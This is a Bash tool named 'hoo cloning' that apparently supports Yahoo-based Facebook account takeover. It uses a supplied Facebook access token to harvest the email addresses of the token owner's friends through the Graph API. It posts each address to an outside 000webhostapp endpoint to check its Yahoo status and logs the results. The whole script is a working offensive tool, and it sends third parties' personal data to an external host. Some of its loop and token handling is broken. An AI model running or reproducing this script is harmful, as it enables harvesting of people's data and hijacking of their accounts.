#!/bin/bash
# -(c) zsecc0de-crew.id ~ widhisec
# -createon   : 16/04/2019
# -lastupdate : 17/04/2019
# -toolsname  : hoo cloning
clear;
command -v curl > /dev/null 2>&1 || { echo >&2 "cURL not installed [!]"; }
if [[ ! -z $(command -v jq) ]]; then
	printf ""
else
	sleep 2
	apt install grep && apt install jq
	printf "selesai terinstall.\n"
fi
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
NORMAL=$(tput sgr0)
CYAN=$(tput setaf 6)
time=$(set `date` && echo -e "$5");
function banner () {
printf "
\t$GREEN.__                   
\t|  |__   ____   ____  
\t|  |  \ /  _ \ /  _ \  [${RED}Create By ${CYAN}Widhisec]
\t|   Y  (  <_> |  <_> ) 
\t|___|  /\____/ \____/ 
\t     \/  
\t
"
}
banner
function get_yahoo(){
                   get_yahoo=$(curl --silent "http://widhitools.000webhostapp.com/api/yahoo.php?" --data "email=$aa" | 
                   jq -r .status)
                   printf "$aa > $get_yahoo" >> output.txt
                   printf "${CYAN}$aa [STATUS] > ${NORMAL}$get_yahoo\n"
}
function hey_kamu () {
	               echo -e -n $RED'[?]'${NORMAL}'Token : ' 
	               read t0k3n
	               echo "tunggu bentar.."
                   gEt=$(curl -Gs "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=299" | jq -r .data | 
                   grep -Po '(?<="email":)[^,]*' | tr -d '""')
                   for aa in $gEt; do
                       startline=1 ###
                       endline="12" ###
                       counter=0
                       default_threads="10"
                       threads="${15:-${default_threads}}"
                       token=$(($counter+1))
                       let token++
                       let counter++
                       let startline+=$threads
                       let endline+=$threads
                       #$(($token+threads))
                       get_yahoo
                   done
}
hey_kamu 
echo "selesai pada jam : $time"
